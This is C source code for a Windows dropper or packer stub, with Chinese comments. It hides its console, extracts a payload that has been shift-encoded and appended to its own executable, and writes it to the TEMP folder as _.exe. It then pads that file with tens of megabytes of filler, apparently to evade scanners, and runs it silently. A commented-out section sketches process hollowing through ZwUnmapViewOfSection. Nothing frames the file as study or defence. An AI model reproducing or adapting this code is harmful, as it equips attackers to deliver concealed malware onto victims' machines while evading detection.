
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
char szPath[MAX_PATH];//当前程序路径
char const address[] = "**********CUTLINE**********";
char const fill[] = "dsjklgjskdgjkasjdg;klajdg;fjkasjbojdlkgjaklfdgupiupjeptjapwrewigjipajglkfnglkhjflkgnlfghlknfhkldjfkhjdkfhmnkdfjhlkdnjfhndlkfnhbk;ldnfhnk;dzfnhk;dnfz;khndfhnkd";
/*
typedef DWORD (WINAPI *PTRZwUnmapViewOfSection)(IN HANDLE ProcessHandle, IN PVOID BaseAddress);

void ClearProcess(PROCESS_INFORMATION *pi){
    TerminateProcess(pi->hProcess,0);
    CloseHandle(pi->hThread);
    CloseHandle(pi->hProcess);

}

//想了想发现貌似并不需要这部分
BOOL RunInMemory(char *buff){
    IMAGE_NT_HEADERS inh;
    IMAGE_DOS_HEADER idh;
    IMAGE_SECTION_HEADER ish;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    CONTEXT context;

    int addr,ImageBase;   
    CopyMemory(&idh,&buff[1],sizeof(idh));
    if(idh.e_magic != 23117)return FALSE;//MZ
    CopyMemory(&inh,&buff[idh.e_lfanew+1],sizeof(inh));
    if(inh.Signature != 17744) return FALSE;//PE_FLAG
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; 
    si.wShowWindow=SW_HIDE; 
    PROCESS_INFORMATION ProcessInformation;
    if(!CreateProcess(NULL,"cmd.exe",NULL,NULL,FALSE,4,NULL,NULL,&si,&ProcessInformation))return FALSE;
    context.ContextFlags = 65538;
    if(GetThreadContext(pi.hThread,&context) == 0){
        // ClearProcess(pi);
        return FALSE;
    }
    ReadProcessMemory(pi.hProcess,(void*)(context.Ebx+8),&addr,4,0);
    if(addr==0){
        ClearProcess(&pi);
        return FALSE;
    }

    PTRZwUnmapViewOfSection pZwUnmapViewOfSection = (PTRZwUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
    if(pZwUnmapViewOfSection(pi.hProcess,&addr)==0){
        ClearProcess(&pi);
        return FALSE;
    }
    ImageBase = VirtualAllocEx(pi.hProcess,inh.OptionalHeader.ImageBase,inh.OptionalHeader.SizeOfImage,MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (ImageBase==0){
        ClearProcess(&pi);
        return FALSE;
    }


}
*/

void UnPacket(char *buff,int size){
    char a;
    for (int i=0;i<=size;i++){
        memcpy(&a,buff+i,sizeof(char));
        buff[i]=(char)((int)a-1);
    }
}


int _stdcall WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
){
    // Sleep(1000*60);
    int file_size;
    DWORD dwRead;
    char target[MAX_PATH];
    HANDLE hFile,hFile2;
    char *buff;
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (!GetModuleFileName(NULL,(LPSTR)szPath,MAX_PATH)) return 1;
    if ( !GetEnvironmentVariable("TEMP", (LPSTR)target, MAX_PATH) ) return 1;
    strcat(target,"\\_.exe");
    
    hFile = CreateFile(szPath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    file_size=GetFileSize(hFile,NULL);
    // printf("SIZE:%d\n",file_size);
    buff = (char*)malloc(file_size);
    if(!ReadFile(hFile,buff,file_size,&dwRead,NULL))return 1;
    buff[file_size]='\0';
    int packet = atoi(address);

    // printf("%d",(int)packet);
    if(packet != 1 ){
        UnPacket((char*)((int)buff+file_size-packet),packet);
        hFile2 = CreateFile(target,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
        WriteFile(hFile2,(char*)((int)buff+file_size-packet),packet,&dwRead,NULL);
        for (int i=0;i<=202400;i++){
            WriteFile(hFile2,fill,sizeof(fill),&dwRead,NULL);
        }
        CloseHandle(hFile2);
        CloseHandle(hFile);
        system(target);
    }
    
    CloseHandle(hFile2);
}